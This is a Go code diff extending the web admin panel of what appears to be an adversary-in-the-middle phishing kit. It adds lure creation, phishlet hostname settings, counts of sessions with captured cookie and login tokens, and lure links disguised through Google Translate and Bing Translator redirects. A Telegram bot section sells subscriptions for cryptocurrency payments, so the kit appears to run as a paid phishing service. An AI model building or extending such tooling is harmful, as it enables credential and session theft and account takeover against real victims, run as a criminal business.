@@ -193,6 +193,145 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 			s.Db.DeleteSessionById(sid)
 			http.Redirect(w, r, "/admin/panel?tab=sessions", http.StatusSeeOther)
 			return
+
+		// ── Lure management ──
+		case "create_lure":
+			pl := strings.TrimSpace(r.FormValue("phishlet"))
+			path := strings.TrimSpace(r.FormValue("path"))
+			redir := strings.TrimSpace(r.FormValue("redirect_url"))
+			user := strings.TrimSpace(r.FormValue("user_id"))
+			if pl == "" {
+				http.Redirect(w, r, "/admin/panel?tab=lures&err=phishlet+required", http.StatusSeeOther)
+				return
+			}
+			if path == "" {
+				path = "/" + GenRandomString(8)
+			}
+			lure := &Lure{Path: path, Phishlet: pl, RedirectUrl: redir, UserId: user}
+			s.Cfg.AddLure(pl, lure)
+			http.Redirect(w, r, "/admin/panel?tab=lures&ok=lure+created", http.StatusSeeOther)
+			return
+
+		case "delete_lure":
+			idx, _ := strconv.Atoi(r.FormValue("lure_id"))
+			s.Cfg.DeleteLure(idx)
+			http.Redirect(w, r, "/admin/panel?tab=lures", http.StatusSeeOther)
+			return
+
+		case "edit_lure":
+			idx, _ := strconv.Atoi(r.FormValue("lure_id"))
+			l, err := s.Cfg.GetLure(idx)
+			if err == nil {
+				if v := strings.TrimSpace(r.FormValue("redirect_url")); v != "" {
+					l.RedirectUrl = v
+				}
+				if v := strings.TrimSpace(r.FormValue("path")); v != "" {
+					l.Path = v
+				}
+				s.Cfg.SetLure(idx, l)
+			}
+			http.Redirect(w, r, "/admin/panel?tab=lures&ok=lure+updated", http.StatusSeeOther)
+			return
+
+		// ── Phishlet management ──
+		case "enable_phishlet":
+			site := strings.TrimSpace(r.FormValue("site"))
+			if err := s.Cfg.SetSiteEnabled(site); err != nil {
+				http.Redirect(w, r, "/admin/panel?tab=phishlets&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
+			} else {
+				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok="+url.QueryEscape(site+" enabled"), http.StatusSeeOther)
+			}
+			return
+
+		case "disable_phishlet":
+			site := strings.TrimSpace(r.FormValue("site"))
+			if err := s.Cfg.SetSiteDisabled(site); err != nil {
+				http.Redirect(w, r, "/admin/panel?tab=phishlets&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
+			} else {
+				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok="+url.QueryEscape(site+" disabled"), http.StatusSeeOther)
+			}
+			return
+
+		case "set_phishlet_hostname":
+			site := strings.TrimSpace(r.FormValue("site"))
+			hostname := strings.TrimSpace(r.FormValue("hostname"))
+			if ok := s.Cfg.SetSiteHostname(site, hostname); !ok {
+				http.Redirect(w, r, "/admin/panel?tab=phishlets&err=failed+to+set+hostname", http.StatusSeeOther)
+			} else {
+				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok=hostname+saved", http.StatusSeeOther)
+			}
+			return
+
+		case "set_phishlet_unauth":
+			site := strings.TrimSpace(r.FormValue("site"))
+			unauthUrl := strings.TrimSpace(r.FormValue("unauth_url"))
+			if ok := s.Cfg.SetSiteUnauthUrl(site, unauthUrl); !ok {
+				http.Redirect(w, r, "/admin/panel?tab=phishlets&err=invalid+unauth+url", http.StatusSeeOther)
+			} else {
+				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok=unauth+url+saved", http.StatusSeeOther)
+			}
+			return
+
+		// ── Telegram Bot config ──
+		case "save_bot_config":
+			token := strings.TrimSpace(r.FormValue("bot_token"))
+			adminIdStr := strings.TrimSpace(r.FormValue("bot_admin_chat_id"))
+			adminId, _ := strconv.ParseInt(adminIdStr, 10, 64)
+			btc := strings.TrimSpace(r.FormValue("crypto_btc"))
+			eth := strings.TrimSpace(r.FormValue("crypto_eth"))
+			usdt := strings.TrimSpace(r.FormValue("crypto_usdt"))
+			priceStr := strings.TrimSpace(r.FormValue("sub_price"))
+			price, _ := strconv.Atoi(priceStr)
+			if token != "" {
+				s.Cfg.SetBotToken(token)
+			}
+			if adminId != 0 {
+				s.Cfg.SetBotAdminChatId(adminId)
+			}
+			if btc != "" {
+				s.Cfg.SetCryptoBTC(btc)
+			}
+			if eth != "" {
+				s.Cfg.SetCryptoETH(eth)
+			}
+			if usdt != "" {
+				s.Cfg.SetCryptoUSDT(usdt)
+			}
+			if price > 0 {
+				s.Cfg.SetSubPrice(price)
+			}
+			http.Redirect(w, r, "/admin/panel?tab=telegram&ok=bot+config+saved+(restart+to+apply+token+change)", http.StatusSeeOther)
+			return
+
+		case "approve_sub":
+			id, _ := strconv.Atoi(r.FormValue("sub_id"))
+			if GlobalBot != nil {
+				if err := GlobalBot.ApproveSub(id, s.Cfg.GetBotAdminChatId()); err != nil {
+					http.Redirect(w, r, "/admin/panel?tab=telegram&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
+					return
+				}
+			} else {
+				http.Redirect(w, r, "/admin/panel?tab=telegram&err=bot+not+running", http.StatusSeeOther)
+				return
+			}
+			http.Redirect(w, r, "/admin/panel?tab=telegram&ok=approved", http.StatusSeeOther)
+			return
+
+		case "reject_sub":
+			id, _ := strconv.Atoi(r.FormValue("sub_id"))
+			if GlobalBot != nil {
+				GlobalBot.RejectSub(id, s.Cfg.GetBotAdminChatId())
+			} else {
+				s.Db.DeleteSubscription(id)
+			}
+			http.Redirect(w, r, "/admin/panel?tab=telegram", http.StatusSeeOther)
+			return
+
+		case "delete_sub":
+			id, _ := strconv.Atoi(r.FormValue("sub_id"))
+			s.Db.DeleteSubscription(id)
+			http.Redirect(w, r, "/admin/panel?tab=telegram", http.StatusSeeOther)
+			return
 		}
 	}
 
@@ -200,11 +339,19 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 	userList, _ := s.Db.ListUsers()
 	allSessions, _ := s.Db.ListSessions()
 	allLures := s.Cfg.GetAllLures()
+	allSubs, _ := s.Db.ListSubscriptions()
 
 	totalTokens := 0
 	for _, sess := range allSessions {
 		if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
 			totalTokens++
+		}
+	}
+
+	pendingSubs := 0
+	for _, sub := range allSubs {
+		if sub.Status == "pending" {
+			pendingSubs++
 		}
 	}
 
@@ -244,8 +391,10 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
   <div class="stat-box"><div class="n blue">%d</div><div class="l">Lures</div></div>
   <div class="stat-box"><div class="n">%d</div><div class="l">Sessions</div></div>
   <div class="stat-box"><div class="n green">%d</div><div class="l">With Tokens</div></div>
-  <div class="stat-box"><div class="n" style="color:#e0a040">%d</div><div class="l">Blacklisted</div></div>
-</div>`, len(userList), len(allLures), len(allSessions), totalTokens, blCount))
+  <div class="stat-box"><div class="n" style="color:#e0a040">%d</div><div class="l">Subscriptions</div></div>
+  <div class="stat-box"><div class="n" style="color:#e05252">%d</div><div class="l">Pending Subs</div></div>
+  <div class="stat-box"><div class="n" style="color:#555">%d</div><div class="l">Blacklisted</div></div>
+</div>`, len(userList), len(allLures), len(allSessions), totalTokens, len(allSubs), pendingSubs, blCount))
 
 	if errMsg != "" {
 		b.WriteString(fmt.Sprintf(`<div class="err">%s</div>`, template.HTMLEscapeString(errMsg)))
@@ -255,12 +404,18 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// ── Tab nav ──
+	pendingLabel := "Telegram Bot"
+	if pendingSubs > 0 {
+		pendingLabel = fmt.Sprintf("Telegram Bot (%d pending)", pendingSubs)
+	}
 	tabs := []struct{ id, label string }{
 		{"overview", "Overview"},
 		{"users", "Users"},
+		{"phishlets", "Phishlets"},
 		{"lures", "Lures & Chains"},
 		{"sessions", "Sessions"},
 		{"blacklist", "Blacklist"},
+		{"telegram", pendingLabel},
 	}
 	b.WriteString(`<div class="tabs">`)
 	for _, t := range tabs {
@@ -308,11 +463,95 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		b.WriteString(usersTable(userList, allLures, sessPerUser, tokenPerUser))
 		b.WriteString(`</div>`)
 
+	// ── PHISHLETS ─────────────────────────────────────────────────────────
+	case "phishlets":
+		b.WriteString(`<div class="section"><h2>Phishlet Configuration</h2>`)
+		names := s.Cfg.GetPhishletNames()
+		if len(names) == 0 {
+			b.WriteString(`<div class="empty">No phishlets loaded. Add .yaml files to your phishlets directory.</div>`)
+		} else {
+			b.WriteString(`<table><thead><tr>
+<th>Name</th><th>Service</th><th>Hostname</th><th>Unauth URL</th><th>Status</th><th>Actions</th>
+</tr></thead><tbody>`)
+			for _, name := range names {
+				pc := s.Cfg.PhishletConfig(name)
+				enabled := pc.Enabled
+				statusBadge := `<span class="badge badge-gray">disabled</span>`
+				if enabled {
+					statusBadge = `<span class="badge badge-green">enabled</span>`
+				}
+				hostname := pc.Hostname
+				if hostname == "" {
+					hostname = `<span style="color:#555">not set</span>`
+				}
+				unauthUrl := pc.UnauthUrl
+				if unauthUrl == "" {
+					unauthUrl = `<span style="color:#555">—</span>`
+				}
+
+				toggleBtn := ""
+				if enabled {
+					toggleBtn = fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=phishlets">
+<input type="hidden" name="action" value="disable_phishlet">
+<input type="hidden" name="site" value="%s">
+<button type="submit" class="btn-gray" style="font-size:.74rem;padding:2px 8px">disable</button>
+</form>`, template.HTMLEscapeString(name))
+				} else {
+					toggleBtn = fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=phishlets">
+<input type="hidden" name="action" value="enable_phishlet">
+<input type="hidden" name="site" value="%s">
+<button type="submit" class="btn-green" style="font-size:.74rem;padding:2px 8px">enable</button>
+</form>`, template.HTMLEscapeString(name))
+				}
+
+				hostnameForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=phishlets" style="display:flex;gap:4px;margin-top:4px">
+<input type="hidden" name="action" value="set_phishlet_hostname">
+<input type="hidden" name="site" value="%s">
+<input type="text" name="hostname" placeholder="sub.yourdomain.com" style="font-size:.76rem;padding:3px 6px;width:200px" value="%s">
+<button type="submit" style="font-size:.74rem;padding:3px 8px">set</button>
+</form>`, template.HTMLEscapeString(name), template.HTMLEscapeString(pc.Hostname))
+
+				unauthForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=phishlets" style="display:flex;gap:4px;margin-top:4px">
+<input type="hidden" name="action" value="set_phishlet_unauth">
+<input type="hidden" name="site" value="%s">
+<input type="text" name="unauth_url" placeholder="https://..." style="font-size:.76rem;padding:3px 6px;width:200px" value="%s">
+<button type="submit" style="font-size:.74rem;padding:3px 8px">set</button>
+</form>`, template.HTMLEscapeString(name), template.HTMLEscapeString(pc.UnauthUrl))
+
+				b.WriteString(fmt.Sprintf(`<tr>
+<td><span class="badge badge-red">%s</span></td>
+<td style="color:#aaa;font-size:.82rem">%s</td>
+<td>%s%s</td>
+<td>%s%s</td>
+<td>%s</td>
+<td>%s</td>
+</tr>`,
+					template.HTMLEscapeString(name),
+					phishletFriendlyName(name),
+					hostname, hostnameForm,
+					unauthUrl, unauthForm,
+					statusBadge,
+					toggleBtn,
+				))
+			}
+			b.WriteString(`</tbody></table>`)
+		}
+		b.WriteString(`</div>`)
+
+		// Quick create lure from this tab too
+		b.WriteString(`<div class="section"><h2>Quick Create Lure</h2>`)
+		b.WriteString(createLureForm(s.Cfg.GetPhishletNames(), userList))
+		b.WriteString(`</div>`)
+
 	// ── LURES & CHAINS ────────────────────────────────────────────────────
 	case "lures":
+		b.WriteString(`<div class="section"><h2>Create Lure</h2>`)
+		b.WriteString(createLureForm(s.Cfg.GetPhishletNames(), userList))
+		b.WriteString(`</div>`)
+
 		b.WriteString(`<div class="section"><h2>All Lures</h2>`)
 		if len(allLures) == 0 {
-			b.WriteString(`<div class="empty">No lures configured. Use the terminal: <code>lures create &lt;phishlet&gt;</code></div>`)
+			b.WriteString(`<div class="empty">No lures configured yet. Create one above.</div>`)
 		} else {
 			b.WriteString(`<table><thead><tr>
 <th>#</th><th>Phishlet</th><th>Lure URL</th><th>Redirect URL</th><th>Assigned User</th><th>Redirect Chain</th><th>Actions</th>
@@ -405,9 +644,15 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 <button type="submit" style="font-size:.74rem;padding:3px 8px">save</button>
 </form>`, i, userOptions)
 
+				deleteLureBtn := fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=lures" onsubmit="return confirm('Delete lure %d?')">
+<input type="hidden" name="action" value="delete_lure">
+<input type="hidden" name="lure_id" value="%d">
+<button type="submit" style="font-size:.74rem;padding:2px 8px">del</button>
+</form>`, i, i)
+
 				b.WriteString(fmt.Sprintf(`<tr>
 <td class="mono">%d</td>
-<td><span class="badge badge-red">%s</span></td>
+<td><span class="badge badge-red">%s</span><br><span style="color:#555;font-size:.72rem">%s</span></td>
 <td>%s</td>
 <td>%s</td>
 <td>%s<br style="margin:4px">%s</td>
@@ -415,10 +660,11 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 <td>%s</td>
 </tr>`, i,
 					template.HTMLEscapeString(l.Phishlet),
+					phishletFriendlyName(l.Phishlet),
 					lureURLCell, redirectCell,
 					userCell, assignForm,
 					chainCell,
-					`<span style="color:#383838;font-size:.74rem">edit in terminal</span>`,
+					deleteLureBtn,
 				))
 			}
 			b.WriteString(`</tbody></table>`)
@@ -483,13 +729,147 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 			}
 		}
 		b.WriteString(`</div>`)
+
+	// ── TELEGRAM BOT ──────────────────────────────────────────────────────
+	case "telegram":
+		// ── Bot configuration card ──
+		b.WriteString(`<div class="section"><h2>Bot Configuration</h2>`)
+		b.WriteString(fmt.Sprintf(`<div class="card">
+<form method="POST" action="/admin/panel?tab=telegram">
+<input type="hidden" name="action" value="save_bot_config">
+<div class="form-row">
+  <label style="color:#666;width:160px;font-size:.8rem">Bot Token</label>
+  <input type="text" name="bot_token" placeholder="from @BotFather" value="%s" style="width:340px">
+</div>
+<div class="form-row">
+  <label style="color:#666;width:160px;font-size:.8rem">Admin Chat ID</label>
+  <input type="text" name="bot_admin_chat_id" placeholder="your Telegram chat ID" value="%d" style="width:200px">
+</div>
+<div class="form-row">
+  <label style="color:#666;width:160px;font-size:.8rem">BTC Address</label>
+  <input type="text" name="crypto_btc" placeholder="Bitcoin address" value="%s" style="width:340px">
+</div>
+<div class="form-row">
+  <label style="color:#666;width:160px;font-size:.8rem">ETH Address</label>
+  <input type="text" name="crypto_eth" placeholder="Ethereum address" value="%s" style="width:340px">
+</div>
+<div class="form-row">
+  <label style="color:#666;width:160px;font-size:.8rem">USDT Address</label>
+  <input type="text" name="crypto_usdt" placeholder="USDT (TRC20) address" value="%s" style="width:340px">
+</div>
+<div class="form-row">
+  <label style="color:#666;width:160px;font-size:.8rem">Price (USD/month)</label>
+  <input type="text" name="sub_price" placeholder="150" value="%d" style="width:100px">
+</div>
+<div class="form-row" style="margin-top:12px">
+  <button type="submit" class="btn-blue">Save Bot Config</button>
+  <span style="color:#555;font-size:.78rem;margin-left:8px">Token change requires restart</span>
+</div>
+</form></div>`,
+		template.HTMLEscapeString(s.Cfg.GetBotToken()),
+		s.Cfg.GetBotAdminChatId(),
+		template.HTMLEscapeString(s.Cfg.GetCryptoBTC()),
+		template.HTMLEscapeString(s.Cfg.GetCryptoETH()),
+		template.HTMLEscapeString(s.Cfg.GetCryptoUSDT()),
+		s.Cfg.GetSubPrice(),
+	))
+		b.WriteString(`</div>`)
+
+		// ── Subscriptions table ──
+		b.WriteString(`<div class="section"><h2>Subscriptions</h2>`)
+		if len(allSubs) == 0 {
+			b.WriteString(`<div class="empty">No subscriptions yet.</div>`)
+		} else {
+			b.WriteString(`<table><thead><tr>
+<th>ID</th><th>Chat ID</th><th>Service</th><th>Status</th><th>TX Hash</th><th>Expires</th><th>Links</th><th>Actions</th>
+</tr></thead><tbody>`)
+			for _, sub := range allSubs {
+				statusBadge := `<span class="badge badge-gray">` + template.HTMLEscapeString(sub.Status) + `</span>`
+				switch sub.Status {
+				case "active":
+					statusBadge = `<span class="badge badge-green">active</span>`
+				case "pending":
+					statusBadge = `<span class="badge badge-yellow">pending</span>`
+				case "expired":
+					statusBadge = `<span class="badge badge-red">expired</span>`
+				}
+
+				expiry := `<span style="color:#555">—</span>`
+				if sub.ExpiresAt > 0 {
+					expiry = time.Unix(sub.ExpiresAt, 0).Format("2006-01-02")
+				}
+
+				txCell := `<span style="color:#555">—</span>`
+				if sub.TxHash != "" {
+					txCell = fmt.Sprintf(`<span class="mono" style="font-size:.74rem">%s</span>`, template.HTMLEscapeString(truncateStr(sub.TxHash, 18)))
+				}
+
+				linksCell := `<span style="color:#555">—</span>`
+				if sub.ChainTranslate != "" || sub.LureURL != "" {
+					linksCell = `<details><summary style="font-size:.76rem;color:#52b0e0">▶ links</summary><div class="chain-box" style="font-size:.74rem">`
+					if sub.LureURL != "" {
+						linksCell += fmt.Sprintf(`<div class="label">Direct URL</div><div class="link"><a href="%s" target="_blank">%s</a> <button class="btn-gray" style="font-size:.68rem;padding:1px 5px" onclick="cp(this)" data-copy="%s">copy</button></div>`,
+							template.HTMLEscapeString(sub.LureURL), template.HTMLEscapeString(truncateStr(sub.LureURL, 40)), template.HTMLEscapeString(sub.LureURL))
+					}
+					if sub.ChainTranslate != "" {
+						linksCell += fmt.Sprintf(`<div class="label">Google Translate</div><div class="link"><a href="%s" target="_blank">%s</a> <button class="btn-gray" style="font-size:.68rem;padding:1px 5px" onclick="cp(this)" data-copy="%s">copy</button></div>`,
+							template.HTMLEscapeString(sub.ChainTranslate), template.HTMLEscapeString(truncateStr(sub.ChainTranslate, 40)), template.HTMLEscapeString(sub.ChainTranslate))
+					}
+					if sub.ChainBing != "" {
+						linksCell += fmt.Sprintf(`<div class="label">Bing Translator</div><div class="link"><a href="%s" target="_blank">%s</a> <button class="btn-gray" style="font-size:.68rem;padding:1px 5px" onclick="cp(this)" data-copy="%s">copy</button></div>`,
+							template.HTMLEscapeString(sub.ChainBing), template.HTMLEscapeString(truncateStr(sub.ChainBing, 40)), template.HTMLEscapeString(sub.ChainBing))
+					}
+					linksCell += `</div></details>`
+				}
+
+				actions := ""
+				if sub.Status == "pending" {
+					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram">
+<input type="hidden" name="action" value="approve_sub">
+<input type="hidden" name="sub_id" value="%d">
+<button type="submit" class="btn-green" style="font-size:.74rem;padding:2px 8px">✓ approve</button>
+</form> `, sub.Id)
+					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram">
+<input type="hidden" name="action" value="reject_sub">
+<input type="hidden" name="sub_id" value="%d">
+<button type="submit" style="font-size:.74rem;padding:2px 8px">✗ reject</button>
+</form>`, sub.Id)
+				} else {
+					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram" onsubmit="return confirm('Delete subscription %d?')">
+<input type="hidden" name="action" value="delete_sub">
+<input type="hidden" name="sub_id" value="%d">
+<button type="submit" style="font-size:.74rem;padding:2px 8px">del</button>
+</form>`, sub.Id, sub.Id)
+				}
+
+				b.WriteString(fmt.Sprintf(`<tr>
+<td class="mono">%d</td>
+<td class="mono">%d</td>
+<td><span class="badge badge-red">%s</span><br><span style="color:#555;font-size:.72rem">%s</span></td>
+<td>%s</td>
+<td>%s</td>
+<td class="mono">%s</td>
+<td>%s</td>
+<td>%s</td>
+</tr>`,
+					sub.Id, sub.TelegramChatId,
+					template.HTMLEscapeString(sub.Phishlet),
+					phishletFriendlyName(sub.Phishlet),
+					statusBadge, txCell, expiry, linksCell, actions,
+				))
+			}
+			b.WriteString(`</tbody></table>`)
+		}
+		b.WriteString(`</div>`)
 	}
 
 	nav := `<a href="/admin/panel?tab=overview">overview</a>
 <a href="/admin/panel?tab=users">users</a>
+<a href="/admin/panel?tab=phishlets">phishlets</a>
 <a href="/admin/panel?tab=lures">lures</a>
 <a href="/admin/panel?tab=sessions">sessions</a>
-<a href="/admin/panel?tab=blacklist">blacklist</a>`
+<a href="/admin/panel?tab=blacklist">blacklist</a>
+<a href="/admin/panel?tab=telegram">telegram bot</a>`
 
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
 	fmt.Fprint(w, panelPage("Admin Panel", nav, b.String()))
@@ -757,4 +1137,33 @@ func truncateStr(s string, n int) string {
 		return s
 	}
 	return s[:n] + "…"
+}
+
+// createLureForm renders the "Create Lure" form HTML.
+func createLureForm(phishletNames []string, userList []*database.User) string {
+	if len(phishletNames) == 0 {
+		return `<div class="empty">No phishlets loaded. Add phishlet YAML files to the phishlets directory first.</div>`
+	}
+	opts := ""
+	for _, name := range phishletNames {
+		opts += fmt.Sprintf(`<option value="%s">%s — %s</option>`,
+			template.HTMLEscapeString(name),
+			template.HTMLEscapeString(name),
+			phishletFriendlyName(name))
+	}
+	userOpts := `<option value="">— no user —</option>`
+	for _, u := range userList {
+		userOpts += fmt.Sprintf(`<option value="%s">%s</option>`,
+			template.HTMLEscapeString(u.Username), template.HTMLEscapeString(u.Username))
+	}
+	return fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=lures">
+<input type="hidden" name="action" value="create_lure">
+<div class="form-row">
+  <select name="phishlet" required style="width:240px">%s</select>
+  <input type="text" name="path" placeholder="path (auto-generated if empty)" style="width:220px">
+  <input type="text" name="redirect_url" placeholder="redirect URL after capture (optional)" style="width:280px">
+  <select name="user_id" style="width:160px">%s</select>
+  <button type="submit" class="btn-blue">+ Create Lure</button>
+</div>
+</form>`, opts, userOpts)
 }
